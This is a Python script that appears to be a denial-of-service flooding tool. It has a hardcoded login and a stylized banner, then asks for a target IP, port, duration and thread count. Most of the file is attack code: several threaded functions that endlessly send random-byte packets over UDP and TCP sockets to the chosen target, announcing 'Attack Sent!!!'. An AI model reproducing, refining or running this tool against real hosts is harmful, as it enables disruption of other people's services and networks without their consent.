# -*- coding: utf-8 -*-
import logging
import random
import socket
import threading
import os
import sys
import time
import fade
os.system("clear")

# Colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    UNDERLINE = '\033[4m'
    PURPLE = '\033[97m'
    BOLD    = "\033[1m"
    BLACK   = "\033[30m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"

attemps = 0
os.system("clear")
logo = """
    ▓▒▓▒▓▒▓▒░     ▓▒▓▒░      ▓▒▓▒▓▒▓▒░   ▓▒▓▒▓▒▓▒░   ▓▒▓▒▓▒░       
    ▓▒░     ▓▒░  ▓▒░  ▓▒░   ▓▒░          ▓▒░           ▓▒░    ▓▒░      
    ▓▒░     ▓▒░ ▓▒░    ▓▒░  ▓▒░          ▓▒░                  ▓▒░  
    ▓▒▓▒▓▒▓▒░   ▓▒░    ▓▒░   ▓▒░▓▒░▓▒░   ▓▒░              ▓▒░  
    ▓▒░     ▓▒░ ▓▒░    ▓▒░          ▓▒░  ▓▒▓▒▓▒▓▒░       ▓▒░  
    ▓▒░     ▓▒░ ▓▒░▓▒▓▒▓▒░          ▓▒░  ▓▒░            ▓▒░  
    ▓▒▓▒▓▒▓▒░   ▓▒░    ▓▒░   ▓▒▓▒▓▒▓▒░ ▓▒▓▒▓▒▓▒░     ▓▒▓▒▓▒▓▒░    
    ▒░▒░▒░▒░     ▒░     ▒░     ▒░▒░▒▒░   ▒░▒░▒░▒░      ▒░▒░▒▒░    
       ░▒ ░       ░      ░       ▒░ ░       ░ ▒░           ▒░▒░  
        ▒░          ░   ░          ░          ░              ░  
╔══════════════════════════════════════════════════════════════╗


╚══════════════════════════════════════════════════════════════╝
"""
faded_text = fade.fire(logo)
print(faded_text)
while attemps < 100:
    username = input('Enter your username: ')
    password = input('Enter your password: ')

    if username == '6453' and password == '6453':
        print('Selamat datang di zona BASE!!')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue
os.system("clear")



ip = str(input(" Target IP :"))
port = int(input(" Target Port :"))
choice = str(input(" (y/n) :"))
times = int(input(" Time :"))
threads = int(input(" Threads :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"Attack Sent!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Attack Sent!!!")
		except:
			s.close()
			print("[*] Error!!!")
            

def run3():
	data = random._urandom(818)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Attack Sent!!!")
		except:
			s.close()
			print("[*] Error!!!")
            
  
def run4():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Attack Sent!!!")
		except:
			s.close()
			print("[*] Error!!!")
											
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
else:
		th = threading.Thread(target = run4)
		th.start()
